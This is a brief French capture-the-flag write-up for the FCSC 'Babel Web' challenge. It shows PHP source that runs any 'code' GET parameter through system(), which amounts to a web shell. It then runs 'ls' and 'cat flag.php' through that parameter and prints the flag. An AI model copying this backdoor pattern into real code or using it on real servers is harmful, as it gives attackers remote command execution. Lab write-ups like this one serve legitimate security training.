# Babel Web
En inspectant le code HTML on voit un lien vers `?source=1`. En allant sur la page on obtient ce code :

```php
<?php
    if (isset($_GET['source'])) {
        @show_source(__FILE__);
    }  else if(isset($_GET['code'])) {
        print("<pre>");
        @system($_GET['code']);
        print("<pre>");
    } else {
?>
<html>
    <head>
        <title>Bienvenue à Babel Web!</title>
    </head>    
    <body>
        <h1>Bienvenue à Babel Web!</h1>
        La page est en cours de développement, merci de revenir plus tard.
        <!-- <a href="?source=1">source</a> -->
    </body>
</html>
<?php
    }
?>
```

On voit clairement qu'en passant un paramètre code, celui-ci est interprété dans le terminal. On fait donc `?code=ls` pour lister les fichiers puis `?code=cat flag.php` puis en inspectant la page on obtient le flag.

Flag : `FCSC{5d969396bb5592634b31d4f0846d945e4befbb8c470b055ef35c0ac090b9b8b7}`